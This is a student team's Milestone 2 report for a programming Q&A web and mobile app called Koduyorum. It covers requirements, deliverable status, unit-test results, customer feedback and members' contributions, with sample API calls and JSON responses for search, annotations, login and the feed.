
# Requirements Adressed in this Milestone

- **1.1.1.4** Users shall select up to 5 predefined labels to categorize their posts.
- **1.1.1.8** Users shall be able to edit or delete their posts.
- **1.1.2.1** Users shall see the most active posts in the feed by default.
- **1.1.2.2** Users shall be able to filter questions in the feed based on:
  - **1.1.2.2.1** Post status (answered or unanswered)
  - **1.1.2.2.2** Programming language
- **1.1.2.4** Users shall be able to upvote and downvote posts directly from the feed.
- **1.1.3.1** Each programming language shall have its own dedicated forum page.
- **1.1.3.2** Each forum page shall display posts tagged with labels relevant to that programming language.
- **1.1.6.4** Users shall be able to search for programming languages by name or attributes.
- **1.1.9.1** Users should be able to add a profile photo.
- **1.1.9.2** Users shall be able to edit their names.
- **1.1.9.3** Users shall be able to delete their account.
- **1.1.9.4** Users shall be able to list their own posts in their profile.
- **1.1.9.7** Users shall be able to update their passwords with a confirmation link to their mail addresses sent.
- **1.2.1.10** The system should support localization, displaying data in different languages if available in Wikidata.
- **1.2.1.11** The system shall ensure that the user interface for browsing is accessible and user-friendly.
- **1.2.1.14** The system shall ensure data consistency and integrity when fetching and displaying information from Wikidata.
- **1.2.2.1** The system shall provide a search functionality for users to search questions in the forum using keywords.
- **2.1.1** The system shall restrict the visibility of user's data (email etc.).
- **2.1.2** Strong encryption mechanisms shall be implemented to ensure that no third parties shall be able to access any sensitive data such as passwords.
- **2.1.3** The system should provide a password recovery mechanism sending a recovery link to the user's email.
- **2.1.5** Strict controls should be implemented to restrict the access to sensitive data like email.These data shall only be accessed when it is necessary,like password recovery.
- **2.3.2** The application should support English and Turkish characters.
- **2.4.1** Application should always run on the server.
- **2.5.1.1** The system shall be able to accommodate text and code execution boxes within question descriptions and comments.
- **2.5.2.1** User profile should contain the authored questions.
- **2.5.2.2** User profile should contain the answered/commented questions.
- **2.5.2.3** User profile should have a unique email linked to it on the whole platform.




# Deliverables

### Status of Deliverables

| Deliverable | Status | Comment | 
| ------------------------------------------------------ | --------  | -------- |
| UX design with focus on domain-specific nature of the features| In progress  | Question of the day and survey implemented, not adequately tested |
| Standard| In progress| Annotation creation implemented both in web and mobile, features including editing and deleting need enhancement, needs tests |
| API Documentation | Completed | The implementation always contained well detailed comments, swagger documentation added in [this PR](https://github.com/bounswe/bounswe2024group9/pull/320),tested |
| Testing | In Progress | Unit tests completed for back end, some integration tests made, needs more integration and user tests |
| General Project Status | In Progress | Most main functionalities implemented (post creation, searching, commenting, code execution) both in web and mobile, minor modifications and a lot of testing are necessary |


### UX Design

Done in [Lab 6](https://github.com/bounswe/bounswe2024group9/pull/265). Also documented in detail in [this Lab 6 report](https://github.com/bounswe/bounswe2024group9/wiki/Lab-Report-%236) with detailed [user stories](https://github.com/bounswe/bounswe2024group9/wiki/User-Stories-for-Lab-%236). 

Some screenshots regarding functionality mentioned in the lab:
1. Question of the day [WEB]
![image](https://hackmd.io/_uploads/ByirawvQJe.png)
2. Sign-up Survey [Mobile]
![image](https://hackmd.io/_uploads/HJR5aDvmyg.png)


### Standard

We have decided to use parts of the [Web Annotation Data Model](https://www.w3.org/TR/annotation-model/). Most of it is implemented in [this PR](https://github.com/bounswe/bounswe2024group9/pull/252). 

In the web's wiki result page, the user may highligh a part of the text they want to annotate and add more information about the highlighted part. We aim to let user interact with parts of texts, comment on each others' annotations, and share information in a more dynamic environment rather than formal comments. Here are few views from our apps showing the implemenetations. We implemented this feature in search section and question pages.
- In our web app search page:
![image](https://hackmd.io/_uploads/BJbH1KDm1e.png)
- In our mobile app question page:
![image](https://hackmd.io/_uploads/S1GqJYvXkx.png)




# Testing
## Testing Strategy Components

### Unit Testing
The project extensively uses Django's TestCase framework for unit testing individual components:

#### Model Testing
- **User Model Tests**: Verify user creation, authentication, and role management
- **Question Model Tests**: Validate question creation, modification, and related operations
- **Comment Model Tests**: Test comment functionality and relationships
- **Vote Model Tests**: Ensure proper voting mechanism implementation

#### View Testing
- **User Views**: Test authentication, profile management, and user operations
- **Question Views**: Verify CRUD operations for questions
- **Comment Views**: Test comment creation, editing, and deletion
- **Utilization Views**: Validate utility functions and operations

### Integration Test
- An integration test for wikidata searching and result viewing was written in [this PR](https://github.com/bounswe/bounswe2024group9/pull/306). In a single test, all of the necessary functions including search, result, and login are mocked by using Magicmock's function. Necessary fields for the mock data were taken manually from the "Scala" Wikidata search. In the test, a logged in user searches for "scala" and then retrieves the related Wikidata results. More similar integration tests shall be written for the next milestone.

### Primary Tools
- **Django TestCase**: Main testing framework
- **APIClient**: For testing REST API endpoints
- **patch**: For function and method mocking
- **MagicMock**: For complex object simulation

### Generated unit test reports 
The following unittests are implemented to to test the functions used in the backend.
test_post_sample_code (django_app.test.CodeExecutionTests) ... ok
test_comment_creation (django_app.test.CommentModelTest) ... ok
test_run_snippet (django_app.test.CommentModelTest) ... ok
test_create_comment (django_app.test.CommentViewsTest)
Test creating a comment for a question. ... ok
test_delete_comment (django_app.test.CommentViewsTest)
Test deleting a comment. ... ok
test_edit_comment (django_app.test.CommentViewsTest)
Test editing a comment. ... ok
test_mark_comment_as_answer (django_app.test.CommentViewsTest)
test_question_snippet_execution (django_app.test.QuestionModelTest) ... ok
test_question_str_method (django_app.test.QuestionModelTest)
Test the string representation of the Question model. ... ok
test_bookmark_question (django_app.test.QuestionViewTests) ... ok
test_create_question (django_app.test.QuestionViewTests) ... ok
test_delete_question (django_app.test.QuestionViewTests) ... ok
test_edit_question (django_app.test.QuestionViewTests) ... ok
test_fetch_random_reported_question (django_app.test.QuestionViewTests) ... ok
test_get_question (django_app.test.QuestionViewTests) ... ok
test_get_question_comments (django_app.test.QuestionViewTests) ... ok
test_list_questions_by_hotness (django_app.test.QuestionViewTests) ... ok
test_list_questions_by_language (django_app.test.QuestionViewTests) ... ok
test_mark_as_answered (django_app.test.QuestionViewTests) ... ok
test_random_questions (django_app.test.QuestionViewTests) ... ok
test_remove_bookmark (django_app.test.QuestionViewTests) ... ok
test_report_question (django_app.test.QuestionViewTests) ... ok
test_result_invalid (django_app.test.TestSearchResult) ... ok
test_result_valid (django_app.test.TestSearchResult) ... ok
test_search_invalid (django_app.test.TestSearchResult) ... ok
test_wiki_search_found (django_app.test.TestSearchResult) ... ok
test_check_and_demote_to_user (django_app.test.UserModelTest)
Test that the user is demoted to USER if their points fall below the threshold. ... ok
test_check_and_promote_to_super_user (django_app.test.UserModelTest)
Test that the user is promoted to SUPER_USER when their points exceed the threshold. ... ok
test_add_interested_languages_for_a_user (django_app.test.UserViewsTests)
Test updating user's interested languages. ... ok
test_check_token (django_app.test.UserViewsTests)
Test checking the validity of a token. ... ok
test_delete_user_profile (django_app.test.UserViewsTests)
Test deleting user profile. ... ok
test_edit_user_profile (django_app.test.UserViewsTests)
Test editing user profile. ... ok
test_get_user_preferred_languages (django_app.test.UserViewsTests)
Test retrieving user's preferred languages and interested topics. ... ok
test_get_user_profile_by_id (django_app.test.UserViewsTests)
Test retrieving user profile by user ID. ... ok
test_get_user_profile_by_username (django_app.test.UserViewsTests)
Test retrieving user profile by username. ... ok
test_list_most_contributed_five_person (django_app.test.UserViewsTests)
Test listing the top 5 users by contributions. ... ok
test_login_user (django_app.test.UserViewsTests)
Test user login. ... ok
test_logout_user (django_app.test.UserViewsTests) ... ok
test_reset_password_request (django_app.test.UserViewsTests)
Test password reset request email functionality. ... ok
test_reset_password_view (django_app.test.UserViewsTests)
Test password reset functionality with valid data. ... ok
test_signup (django_app.test.UserViewsTests)
Test user signup. ... ok
test_upload_profile_pic (django_app.test.UserViewsTests)
Test uploading a profile picture. ... ok
test_user_search_and_view_results (django_app.test.UserWorkflowIntegrationTests)
Integration test: A logged-in user searches for "scala" and views details using a received qid. ... ok
test_downvote_comment (django_app.test.UtilsViews) ... ok
test_run_code_of_comment (django_app.test.UtilsViews) ... ok
test_run_code_of_question (django_app.test.UtilsViews) ... ok
test_upvote_comment (django_app.test.UtilsViews) ... ok
test_comment_vote_creation (django_app.test.VoteModelTest) ... ok
test_question_vote_creation (django_app.test.VoteModelTest) ... ok
test_vote_str_method (django_app.test.VoteModelTest) ... ok



# Planning and Team Process

- A change in our team from milestone 1 was the actual joining of a member - Fatih Akgöz. We have spent some time including him in the tasks where he had previous knowledge to incorporate his work as fast and as well as possible.
- We have been careful in opening PR's as well as reviewing and commenting on them. It has made the team more organized and we are planning to continue working like this in the future. 
- Another change from milestone 1 is that the application had most of the question and comment parts in a static way, but now they can be created, edited and deleted by users. Also the application now is mostly covered by unittests , almost every function can be tested via "python manage.py test" command. Unittests are important for error detection and code stability and we will focus on larger coverage for the next milestone.

- The long term plan needed to be updated according to the feedback from milestone 1. It was made in Github's Projects to incorporate all issues and can be updated easily dynamically. Please find the links to [the related Wiki page](https://github.com/bounswe/bounswe2024group9/wiki/Long%E2%80%90term-planning-451) and the actual [Github project](https://github.com/orgs/bounswe/projects/71/views/4) just for reference.
- For the completion of the project, we need to complete functionalities both on web and mobile such as filtering, ordering of posts, annotation enhancement etc. We also need  



# Evaluation
#### **Customer Feedback**
For Milestone 2, the customer acknowledged the improvements in design and usability, particularly appreciating the enhanced demo scenarios that featured better-structured questions. They also pointed out that the demo scenarios could be improved by providing more realistic and detailed posts. The customers appreciated the functionality of the annotations feature but suggested improvements to display ownership information and restrict editing or deleting permissions to the owners of the annotations. The implementation of annotations in the question details view was highlighted as an area requiring further refinement to improve interactivity and detailed discussions. Furthermore, it was highlighted that the system should support general post types in addition to questions, enabling broader community discussions. The search functionality was another focus, with feedback suggesting that it should extend to include user profiles and other entities. Overall, the feedback appreciated the strides made in the project while encouraging more focus on delivering key functionalities and enhancing user experience.

#### Evaluation of Deliverables and Their Impact on the Project Plan
The UX design, particularly for domain-specific features like "Question of the Day" and the survey during onboarding, has been implemented but remains in progress. While these features are functional, they have not yet undergone extensive user testing. Refinements and usability testing are planned to ensure the design aligns with user expectations and effectively serves the target audience. Annotation creation has been implemented successfully on both web and mobile platforms. However, features such as editing and deleting annotations require further enhancement to ensure proper functionality. Additionally, thorough testing is necessary to validate that these features meet the expected standards. The API documentation is complete and includes detailed comments throughout the implementation process. The addition of Swagger documentation in [PR #320](https://github.com/bounswe/bounswe2024group9/pull/320) further ensures that the API is well-documented and easy to understand. This deliverable has been tested and meets project requirements. Testing is an ongoing process. Unit tests for the backend have been completed, providing a solid foundation for functionality verification. Some integration tests have been conducted, but additional integration and user tests are required to validate the seamless operation of interconnected components. The project is largely on track, with most of the primary functionalities, such as post creation, searching, commenting, and code execution, implemented on both web and mobile platforms. However, minor modifications and extensive testing are necessary to ensure the system is robust and user-friendly. The project plan has been adjusted to accommodate these additional testing phases, emphasizing quality and user satisfaction over rushed delivery. The status of the deliverables has significantly influenced the project plan. For example, the incomplete testing and refinement of annotation features have delayed full feature releases. Similarly, the focus on user experience enhancements, such as the "Question of the Day" and survey, required reallocation of development resources. However, these adjustments are expected to result in a more polished and reliable product, aligning better with user needs and customer feedback. The inclusion of detailed API documentation and robust backend testing highlights the team's commitment to delivering a high-quality product despite tight deadlines.

#### **Tools**
We have benefited from various software development tools throughout the project.
- **GitHub**: Used extensively for version control, pull requests, and issue tracking. It streamlined team collaboration and enabled detailed code reviews.
- **Django**: Served as the robust backend framework, facilitating user authentication, API endpoints, and database management.
- **React**: Supported the development of responsive and interactive web interfaces, especially for features like the profile page and annotations.

# Individual Contributions

## Kristina Trajkovski
 ### Responsibilities:
Wikidata search and results API endpoints (together with developing the right SPARQL query), annotation web front end, testing and review of testing, long-term plan, report

### API Contributions:

- After the customer milestone updated the wiki_search function to support searching for computer science concepts (recursion, algorithms, object oriented terms etc.). The search endpoint's SPARQL query was severely modified to support searching multiple queries.

1. 'search/\<str:search_strings>' - GET
 -- takes the string to be searched on wikidata as input 
 -- searches for computer languages, computer science paradigms, computing terms, and similar topics on Wikidata through SPARQL
 -- returns at most top 5 best matched instances from Wikidata with their names and Wikidata Qid's
 -- Scenario : Ahmet, an 18-year-old beginner programmer, searches for "recursion" in the navigation bar on the Koduyorum webpage. The system then fetches the related results by calling the API function at URL         `${process.env.REACT_APP_API_URL}/search/"recursion"`.

      The system then receives a dictionary containing related computer science terms as follows: 
`{"head":{"vars":["language","languageLabel"]},"results":{"bindings":[{"language":{"type":"uri","value":"http://www.wikidata.org/entity/Q264164"},"languageLabel":{"xml:lang":"en","type":"literal","value":"recursion"}},{"language":{"type":"uri","value":"http://www.wikidata.org/entity/Q7226600"},"languageLabel":{"xml:lang":"en","type":"literal","value":"Polymorphic recursion"}}]}}` 

    Ahmet will then be offered with two adequate results - "Recursion" and "Polymorphic recursion" either of which when clicked on web or mobile will redirect him to the related result page.
    
2. While implementing the annotations in the web, I have made use of the endpoints created by Mustafa Atak:
  -- 'create_annotation/' - which creates a new annotation with a starting point on the page, ending point on the page, text shown in the annotation, assigned id, and the creator user
  -- 'delete_annotation/\<int:annotation_id>/' - deletes an annotation with a specific id iff the user calling this function is also the creator of the annotation with that id
  -- 'edit_annotation/\<int:annotation_id>/' - modifies the text shown in the annotation without changing its other properties such as annotation_id, creator user, offset, etc.
  -- 'get_annotations_by_language_id/\<int:language_qid>/' - lists all the annotations together with their properties that need to be shown on a wikidata results page
  -- Scenario : Mert, an experienced 22-year-old software engineer, visits the results page of "greedy algorithm" which has no annotations and thinks that some keywords may not be clear for less experienced users. He then highlights the word "heuristic" which then triggers a prompt to create a new annotation.
    In the prompt, he writes "a planned movement" to try to clarify heuristics to others. When he clicks on "create", 
`${process.env.REACT_APP_API_URL}/create_annotation/` 
is called with the data as follows:
`annotationData = {
            text: "a planned movement",
            language_qid: 504353, // Q504353 is the Qid of greedy algorithm
            annotation_starting_point:68, 
            annotation_ending_point:78,
            type: 'annotation',
        };`
    When the page is reloaded, `${process.env.REACT_APP_API_URL}/get_annotations_by_language_id/504353/'` is called, the returned dictionary is `{
  "success": "Annotations retrieved",
  "data": [
    {
      "annotation_id": 58,
      "text": "planned movement",
      "language_qid": 504353,
      "annotation_starting_point": 68,
      "annotation_ending_point": 78,
      "annotation_date": "2024-11-25T20:56:30.919Z",
      "author_id": 1,
      "parent_id": null,
      "child_annotations": []
    }
  ]
}` and the newly created annotation is highlighed. When it is hovered over, the text is shown in a small bubble. Mert may also edit it or delete it.

### Code-related significant issues:

 - [#255](https://github.com/bounswe/bounswe2024group9/issues/255)
 - [#289](https://github.com/bounswe/bounswe2024group9/issues/289)
 - [#296](https://github.com/bounswe/bounswe2024group9/issues/296)
 - [#292 - reviewer](https://github.com/bounswe/bounswe2024group9/issues/292)
 - [#268 - reviewer](https://github.com/bounswe/bounswe2024group9/issues/268)
 - [#272 - reviewer](https://github.com/bounswe/bounswe2024group9/issues/272)
 - [#278 - reviewer](https://github.com/bounswe/bounswe2024group9/issues/278)
### Management-related significant issues:
 - [#301](https://github.com/bounswe/bounswe2024group9/issues/301)
 - [#266 - reviewer](https://github.com/bounswe/bounswe2024group9/issues/266)
 - 

### Pull Requests:
 - [#252](https://github.com/bounswe/bounswe2024group9/pull/252) - had many conflicts with the original SearchResults.js which caused HTML trouble like the titles showing up twice, some of the functions not being exported, etc. I solved it by trying to merge similar functions into one that would still keep the intended results.
 - [#255](https://github.com/bounswe/bounswe2024group9/issues/255) - no conflicts, enhanced search
 - [#256](https://github.com/bounswe/bounswe2024group9/pull/256) - solution was not very clear, solved according to a stack overflow web
 - [#257](https://github.com/bounswe/bounswe2024group9/pull/257) - no conflicts, just functionality added
 - [#265](https://github.com/bounswe/bounswe2024group9/pull/265) - only opened the PR for the lab, contributions and merge solving made by other team mates as well
 - [#280](https://github.com/bounswe/bounswe2024group9/pull/280) - no conflicts, updates only
 - [#287](https://github.com/bounswe/bounswe2024group9/pull/287) - opened the lab PR, added the plans, incorporates other contributions
 - [#293](https://github.com/bounswe/bounswe2024group9/pull/293) - no conflicts, result page enhanced by Wikidata links
 - [#306](https://github.com/bounswe/bounswe2024group9/pull/306) - just a test
 - [#307 - reviewer](https://github.com/bounswe/bounswe2024group9/pull/307) - tests, conflicts unfortunately were not accurate, although it was easily merged before the milestone, it caused a break and was solved with a last-minute hotfix

### Additional Information : 

Some of the front end annotations were not implemented until the end which was due to last-minute re-assignments of the work needed to be done. 

## Serhan Çakmak
 ### Responsibilities:
 Authentication, ux improvement, backend frontend connection, unit testing and review of testing, report

### API Contributions:

- After handling code execution in the first milestone, I focused more on establishing the connection between frontend and backend. This work of mine can be observed in many pages but mostly in question page. Also, I improved the safety of the api calls by reimplementing authentication system using JWT tokens.

1. Implemented 'logout/' - POST and updated 'login/' - POST
-- The complex part about these endpoints was to arrange refresh and access tokens properly to prevent non-users from making harmful requests to the backend.
-- login returns the refresh token to be stored in the frontend. In each request from frontend the token is put in function call's header. On the other hand, logout invalidates this token by putting it to the blacklist.
-- Sample use: ${process.env.REACT_APP_API_URL}/login 
-- Server response: 

    ```
    {
      "status": "success",
      "token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ0b2tlbl90eXBlIjoiYWNjZXNzIiwiZXhwIjoxNzMyODI5ODAyLCJpYXQiOjE3MzI4MjYyNjIsImp0aSI6ImY0MTk0OGMwMDViMTQxY2Q4ODcwMWNiM2RlZjhiMDUwIiwidXNlcl9pZCI6MX0.IWAn5GdS3QKX_XL_7k2pFx8S6oMpvbx6d1D_Z-30l0g",
      "user_id": 1,
      "user_type": "user"
    }
    ```
    Note: Actually user_id is not needed since the backend can identify the     user from the token, it is implemented in this way.

    -- Scenerio: Musa is a 16 y/o computer enthusiast and one day he noticed that he can reach some pages by changing the url by hand. One day he decided to outsmart the developers by writing '/feed' without loggning in. Yet when he tried that, he was redirected to the login page. Without a valid token from the login function — and with his brother already logged out, invalidating the previous token — his attempt failed.

    
2. Additionally, I utilized many functions implemented by Mutti Atak in different pages including survey, feed, and question:
  -- 'question/\${question_id}/comments/' - fetches the comments made to the specific question. 
  -- 'interested_languages/' - sets the interested_topics and known_languages fields for the user entry when the survey is filled by a new user.
  -- 'specific_feed/\${user_id}/' - lists 10 relevant questions to the feed depending on the language preference set with the survey. If there isn't 10 of them, it tries to obtain the rest from the interested_topics of the user. Still not reached the 10 question, it adds randomly chosen questions to make it 10. 
  -- Scenario : Doruk is a sophomore computer science student and he just signed up to the Koduyorum website. As soon as he signed up, he was redirected to survey page. After filling the form  `${process.env.REACT_APP_API_URL}/interested_languages/`
is called and set the data in the backend. Then he logged in and the request from the feed is made: `${process.env.REACT_APP_API_URL}/specific_feed/${user_id}/` and feed displays the following questions since he chose python as his favourite language: (I displayed only one question for demonstration purposes)
`
{
  "questions": [
    {
      "id": 24,
      "title": "Efficient String Manipulation in Python",
      "description": "What are some efficient ways to handle large text files for searching specific patterns in Python?",
      "user_id": 1,
      "upvotes": 0,
      "comments_count": 0,
      "programmingLanguage": "Python (3.12.5)",
      "codeSnippet": "def search_pattern(file_path, pattern):\n    with open(file_path, 'r') as file:\n        for line in file:\n            if pattern in line:\n                print(line.strip())",
      "tags": [
        "string manipulation",
        "file handling",
        "performance"
      ],
      "answered": false,
      "author": "mutti",
      "upvoted_by": [],
      "downvoted_by": []
    }
  ]
}`
    Then he decided to learn more about String Manipulation in Python and the a call is made to `${process.env.REACT_APP_API_URL}/question/${question_id}/comments/` and the following result: 
    `
    {
  "comments": [
    {
      "answer_of_the_question": false,
      "code_snippet": "",
      "comment_id": 61,
      "creationDate": "2024-11-28 21:34:08",
      "details": "Using join() for concatenation: It’s faster than using + in loops.",
      "downvoted_by": [],
      "language": 71,
      "upvoted_by": [],
      "upvotes": 0,
      "user": "mutti"
    }
  ]
}
`
    At the end of the day, he learnt how to manipulate a string in python.

    
### Code-related significant issues:

 - [#220 - reopened](https://github.com/bounswe/bounswe2024group9/issues/220)
 - [#261](https://github.com/bounswe/bounswe2024group9/issues/261)
 - [#296](https://github.com/bounswe/bounswe2024group9/issues/296)
 - [#272](https://github.com/bounswe/bounswe2024group9/issues/272)
 - [#275](https://github.com/bounswe/bounswe2024group9/issues/275)
 - [#272](https://github.com/bounswe/bounswe2024group9/issues/272)
 - [#290](https://github.com/bounswe/bounswe2024group9/issues/290)

### Pull Requests:
 - [#254](https://github.com/bounswe/bounswe2024group9/pull/254) - in the first milestone the authentication was commented out since the changes made in the code disrupted the workflow. Thus, I updated authentication where JWT refresh and access tokens are used.
 - [#265](https://github.com/bounswe/bounswe2024group9/pull/265) - improved ux
 - [#287](https://github.com/bounswe/bounswe2024group9/pull/287) - no conflicts just added scenerios.
 - [#295](https://github.com/bounswe/bounswe2024group9/pull/295) - question page before was partly static, made it dynamic.
 - [#302](https://github.com/bounswe/bounswe2024group9/pull/302) - added code execution error messages
 - [#307](https://github.com/bounswe/bounswe2024group9/pull/307) - observed conflicts since the migration files were changed after tests were implemented.
 - [#257 - reviewer](https://github.com/bounswe/bounswe2024group9/pull/257)- no conflicts
 - [#259 - reviewer](https://github.com/bounswe/bounswe2024group9/pull/259)- no conflicts
 - [#284 - reviewer](https://github.com/bounswe/bounswe2024group9/pull/284)- no conflicts
 - [#285 - reviewer](https://github.com/bounswe/bounswe2024group9/pull/285) - discussed about randomness in the code, deleted the line
 - [#286 - reviewer](https://github.com/bounswe/bounswe2024group9/pull/286)- no conflicts
 - [#297 - reviewer](https://github.com/bounswe/bounswe2024group9/pull/297) -  no conflict
 - [#311 - reviewer](https://github.com/bounswe/bounswe2024group9/pull/311) -  a suggestion regarding to the design of question page
 

## Damla Kayıkçı
 ### Responsibilities:
 UI improvement for Feed and search results page, backend frontend connection, debuging docker, creation of survey page, report

### Main Contributions:

1. After working at the back-end part in the first milestone, I focused more on frontendthis time. I mainly fixed Feed page, which didn't show questions properly (the tags didn't work, language tag and other tags were mixed, upvotes weren't visible).
2. I created Annotation component and createAnnotation functions which were later modified by others. I also styled the Annotation pop up window
3. I modularized components like navigation bar, right side bar and left side bar to be easily imported to new pages and to avoid duplicate code
4. I changed Search Result page appearance. Implemented the same design on the feed page to the questions tab of this page.
5. I created the Survey page which appears when a user first signs up to our app.
6. I modified some of the backend functions of question model to fit the frontend. 
7. I debugged Dockerfiles

### API Contributions:
- I worked as a front-end developer this time so here are some of endpoints that I used:
 -- In Survey page we need the list of avaliable programming languages to ask to the user which of those they know. here is how i send the GET request: `${process.env.REACT_APP_API_URL}/get_api_languages/` and here is the response from the backend:
`{
    "languages": {
        "Assembly (NASM 2.14.02)": 45,
        "Bash (5.0.0)": 46,
        "Basic (FBC 1.07.1)": 47,
        "C (Clang 18.1.8)": 104,
        "C (Clang 7.0.1)": 75,
        "C++ (Clang 7.0.1)": 76,
        "C (GCC 14.1.0)": 103,
        "C++ (GCC 14.1.0)": 105,
        "C (GCC 7.4.0)": 48,
        "C++ (GCC 7.4.0)": 52,
        "C (GCC 8.3.0)": 49,
        "C++ (GCC 8.3.0)": 53,
        "C (GCC 9.2.0)": 50,
        "C++ (GCC 9.2.0)": 54,
        "Clojure (1.10.1)": 86,
        "C# (Mono 6.6.0.161)": 51,
        "COBOL (GnuCOBOL 2.2)": 77,
        "Common Lisp (SBCL 2.0.0)": 55,
        "Dart (2.19.2)": 90,
        "D (DMD 2.089.1)": 56,
        "Elixir (1.9.4)": 57,
        "Erlang (OTP 22.2)": 58,
        "Executable": 44,
        "F# (.NET Core SDK 3.1.202)": 87,
        "Fortran (GFortran 9.2.0)": 59,
        "Go (1.13.5)": 60,
        "Go (1.18.5)": 95,
        "Groovy (3.0.3)": 88,
        "Haskell (GHC 8.8.1)": 61,
        "JavaFX (JDK 17.0.6, OpenJFX 22.0.2)": 96,
        "Java (JDK 17.0.6)": 91,
        "Java (OpenJDK 13.0.1)": 62,
        "JavaScript (Node.js 12.14.0)": 63,
        "JavaScript (Node.js 18.15.0)": 93,
        "JavaScript (Node.js 20.17.0)": 97,
        "JavaScript (Node.js 22.08.0)": 102,
        "Kotlin (1.3.70)": 78,
        "Lua (5.3.5)": 64,
        "Multi-file program": 89,
        "Objective-C (Clang 7.0.1)": 79,
        "OCaml (4.09.0)": 65,
        "Octave (5.1.0)": 66,
        "Pascal (FPC 3.0.4)": 67,
        "Perl (5.28.1)": 85,
        "PHP (7.4.1)": 68,
        "PHP (8.3.11)": 98,
        "Plain Text": 43,
        "Prolog (GNU Prolog 1.4.5)": 69,
        "Python (2.7.17)": 70,
        "Python (3.11.2)": 92,
        "Python (3.12.5)": 100,
        "Python (3.8.1)": 71,
        "R (4.0.0)": 80,
        "R (4.4.1)": 99,
        "Ruby (2.7.0)": 72,
        "Rust (1.40.0)": 73,
        "Scala (2.13.2)": 81,
        "SQL (SQLite 3.27.2)": 82,
        "Swift (5.2.3)": 83,
        "TypeScript (3.7.4)": 74,
        "TypeScript (5.0.3)": 94,
        "TypeScript (5.6.2)": 101,
        "Visual Basic.Net (vbnc 0.0.0.5943)": 84
    }
}`
 -- In Search Result page, questions tab, we need the questions that are asked in that specific language to display. Here is how I sen the GET request: `${process.env.REACT_APP_API_URL}/list_questions_by_language/${encodeURIComponent(wikiName)}/1` here is the response returned (for Python: `/list_questions_by_language/Python/1`):
 `{
    "questions": [
        {
            "id": 1,
            "title": "How to use Django models?",
            "programmingLanguage": "Python",
            "tags": [
                "Django",
                "Python",
                "Models"
            ],
            "details": "I am trying to understand how to create and use Django models effectively.",
            "code_snippet": "def sample_function():\n    print(\"Hello, World!\")",
            "upvotes": 2,
            "author": "mutti",
            "creationDate": "2024-11-12 19:02:22"
        },
        {
            "id": 2,
            "title": "What is the difference between Python 2 and Python 3?",
            "programmingLanguage": "Python",
            "tags": [
                "example",
                "Django",
                "testing"
            ],
            "details": "Looking for a detailed comparison between Python 2 and Python 3.",
            "code_snippet": "def example_code():\n    pass",
            "upvotes": 1,
            "author": "user13",
            "creationDate": "2024-11-12 19:13:32"
        },
        {
            "id": 7,
            "title": "How to manage static files in Django?",
            "programmingLanguage": "Python",
            "tags": [
                "example",
                "Django",
                "testing"
            ],
            "details": "What is the best way to manage static and media files?",
            "code_snippet": "def example_code():\n    pass",
            "upvotes": 1,
            "author": "sheila",
            "creationDate": "2024-11-12 19:13:33"
        },
        {
            "id": 12,
            "title": "What is the difference between Python 2 and Python 3?",
            "programmingLanguage": "Python",
            "tags": [
                "example",
                "Django",
                "testing"
            ],
            "details": "Looking for a detailed comparison between Python 2 and Python 3.",
            "code_snippet": "def example_code():\n    pass",
            "upvotes": 1,
            "author": "user6",
            "creationDate": "2024-11-12 19:13:33"
        },
        {
            "id": 17,
            "title": "How to manage static files in Django?",
            "programmingLanguage": "Python",
            "tags": [
                "example",
                "Django",
                "testing"
            ],
            "details": "What is the best way to manage static and media files?",
            "code_snippet": "def example_code():\n    pass",
            "upvotes": 0,
            "author": "user14",
            "creationDate": "2024-11-12 19:13:33"
        }
    ]
}`

-- To create new annotations I send POST request to `${process.env.REACT_APP_API_URL}/create_annotation/` with this body:
` const annotationData = {
            text: annotationText,
            language_qid: language_id.replace(/^Q/, ''), // Removes the 'Q' at the beginning
            annotation_starting_point:startIndex, 
            annotation_ending_point:endIndex,
            type: 'annotation',
        };
` with real values:
`{
"text": "annotationText",
"language_qid": 2005, 
"annotation_starting_point":0, 
"annotation_ending_point":1,
"type": "annotation"
}`
here is an example response:
`{
    "success": "Annotation created",
    "annotation_id": 65,
    "parent_id": null
}`
    
### Code-related significant issues:

 - [#264](https://github.com/bounswe/bounswe2024group9/issues/264)  created Survey page
 - [#271](https://github.com/bounswe/bounswe2024group9/issues/271) Main contributions 1, 4
 - [#273](https://github.com/bounswe/bounswe2024group9/issues/273) reviewed Ceylin's modifications
 - [#296](https://github.com/bounswe/bounswe2024group9/issues/296) created Annotations component and createAnnotation function

### Pull Requests:
 - [#308](https://github.com/bounswe/bounswe2024group9/pull/308) - I made the changes I mentioned on Main Contributions 1, resolved conflicts
 - [#265](https://github.com/bounswe/bounswe2024group9/pull/265) - lab work: fixed issues in docker, 
 - [#287](https://github.com/bounswe/bounswe2024group9/pull/287) - Main contributions 7, merged to main
 - [#280 - reviewer](https://github.com/bounswe/bounswe2024group9/pull/280)- no conflicts, merged by me
 - [#284 - reviewer](https://github.com/bounswe/bounswe2024group9/pull/284)- no conflicts
 - [#286 - reviewer](https://github.com/bounswe/bounswe2024group9/pull/286)- no conflicts
 - [#294 - reviewer](https://github.com/bounswe/bounswe2024group9/pull/294)- no conflicts
 - [#315 - reviewer](https://github.com/bounswe/bounswe2024group9/pull/315) -  no conflict
 



## Mustafa Atak
 ### Responsibilities:

- Implementing User-Comment-Question-Annotation related endpoints (other than my friends mentioned).
- Fixing web frontend bugs to help my frontend team.
- Deploying the app.

### Main Contributions:
- Between Milestones I added new endpoints for the backend to achieve CRUD (Create, Read, Update, Delete) for questions, users, comments and annotations.
- Cached and collected all requests in one request to make the backend server much faster.
- Fixed the problems and re-deployed the backend and web.
- Developed new user friendly question fetching algorithm.
- Added AI to the platform in order to validate the question before posting.
- Added password reset logic to the platform with a good resetting mail template.dc 

### API Contributions:

- I created a new logic called *list_questions_according_to_the_user* so that new users can familiarize themselves with the platform with questions from languages they are familiar with. After that when I am improving the backend speed I put the logic inside the function `fetch_all_at_once` in order to complete all the feed page requests at once.

1. 'fetch_feed_at_once/< int:user_id >/' - GET
 -- Takes a integer user-id as a query parameter. 
 -- Fetches questions based on the user's known programming languages. If fewer than 10 questions are found, retrieves questions based on the user's interested topics. If still fewer than 10 questions are found, fills the remaining slots with general questions.
 -- Fetches question of the day from the backend daily cache.
 -- Fetches top 5 contributors of the platform at that moment.
 -- This 3 fetch function is called in parallel to make it take a shorter time. After completing 3 functions in parallel it return the result to the user in feed_data object.
